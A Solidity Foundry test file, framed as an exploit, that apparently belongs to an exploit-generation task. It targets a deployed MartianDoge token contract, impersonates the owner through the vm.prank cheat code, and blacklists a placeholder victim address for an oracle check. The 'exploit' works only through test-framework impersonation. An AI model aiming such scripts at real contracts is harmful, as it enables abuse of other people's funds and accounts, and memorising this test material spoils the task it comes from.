// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MartianDoge {
    function owner() external view returns (address);
    function setBlacklist(address account, bool value) external;
    function isBlacklist(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate the owner
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, get the current owner of the contract
        MartianDoge target = MartianDoge(TARGET);
        address owner = target.owner();

        // Label for clarity
        vm.label(owner, "Contract Owner");

        // Impersonate the owner to call setBlacklist
        vm.prank(owner);
        target.setBlacklist(victim, true);

        // Verify the victim is now blacklisted
        bool isBlacklisted = target.isBlacklist(victim);
        require(isBlacklisted, "Victim should be blacklisted");

        // The oracle will check isBlacklist[victim] == true
        // We've successfully demonstrated the owner privilege abuse
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
